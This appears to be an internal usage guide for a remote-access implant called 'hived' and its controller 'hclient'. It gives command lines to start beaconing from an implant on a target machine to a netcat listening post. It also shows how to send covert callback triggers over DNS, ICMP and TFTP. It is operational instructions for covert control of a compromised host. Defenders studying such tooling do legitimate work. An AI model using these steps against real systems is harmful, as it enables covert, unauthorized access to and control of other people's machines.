
1.  Given the following setup using eth0 on both boxes for now:
Client ip Address = 10.3.2.92  <--->  Server ip Address=10.3.2.134

2.  On client, run the following command to start the listener for the
beacons:
"./nc.sh"

3.  The next section shows the proper usage statement for the hived...

-----------------------------------------------------------------------

  Usage:
  ./hived-linux-i686-dbg -a [address] -p [port] 

    [-a address]    - beacon LP IP address
    [-p port]       - beacon LP port
    [-I interface]  - Solaris only, interface to listen for triggers
    [-d delay]      - initial beacon delay (in milliseconds)
    [-i interval]   - beacon interval (in milliseconds)
    [-h]            - print help


  Example:
    ./hived-solaris-sparc-dbg -a 10.3.2.76 -p 9999 -i 100000 -I hme0

-----------------------------------------------------------------------

    On the server which is also the implant on the target box, run
the following command to start the beacons:
./hived-ARCH-PROCESSOR(-dbg) -I hme0 -a 10.3.2.92 -p 9999 -i 60000

   ARCH= linux, solaris
   PROCESSOR= i386, i686
   The -dbg extension permits the debugged version of the code to
   run.

   The -I option FOR SOLARIS ONLY must be either "hme0" or "e1000gX"
   where X is some number 0, 1, ...  Please run "ifconfig -a" to 
   see which one exactly.

   The -a option provides the address for the client which will be
   receiving the beacons and is the address of the box running the
   "nc.sh" command listed in 2 above.

   The -i option is the interval between beacons in miliseconds so
   60000 = 60 seconds = 1 minute.

   Note the -p option stands for the port that the client will be
   listening on.  In our case, the nc.sh script is listening on port
   9999.  You may change nc.sh script on the client to listen on
   other posts if you want to use a different setting.

   a.  For my solaris server box, I issued the following command:
          "./hived-solaris-sparc -a 10.3.2.92 -p 9999 -i 60000"
       If my server was a linux box, I would issue the following command:
          "./hived-linux-i686 -a 10.3.2.92 -p 9999 -i 60000"
       If my server was a windows box, I would issue the following command:
          "HiveServer.exe -a 10.3.2.92 -p 9999"

       Note that the windows default interval is 60 seconds so the 
         -i option was not used but it can be used for another interval
         setting. 

4.  The proper usage parameters for hclient are shown below...

-----------------------------------------------------------------------

  Usage:
  ./hclient-linux-dbg [-p port] 
  ./hclient-linux-dbg [-p port] [-t address] [-a address] [-P protocol] [-d delay] 

  Depending on options, client can send triggers, listen, or both
    [-p port]      - callback port
    [-t address]   - IP address of target
    [-a address]   - IP address of listener
    [-P protocol]  - trigger protocol
    [-d delay]     - (optional) delay between received trigger and callback
    [-h ]          - print this usage

  Examples:
   Coming soon!
-----------------------------------------------------------------------


    For the client to send a trigger, I would enter the following
command:
    "./hlient(-dbg) -P dns-request -p 33333 -t 10.3.2.134 -a 10.3.2.92"

    Valid entries for the -P option (i..e. Trigger Protocol) are as follows:
       dns-request
       ping-request
       ping-reply
       icmp-error
       tftp-wrq

    The -p option stands for the port that the client will have open while listening for the trigger responses to be received.

    The -t option is the address of the box targetted for receiving the trigger (i.e. The address of
    the server from paragraph 1 above.)

    The -a address of the client that is running the nc.sh command from paragraph 2 above and is the
    client address.


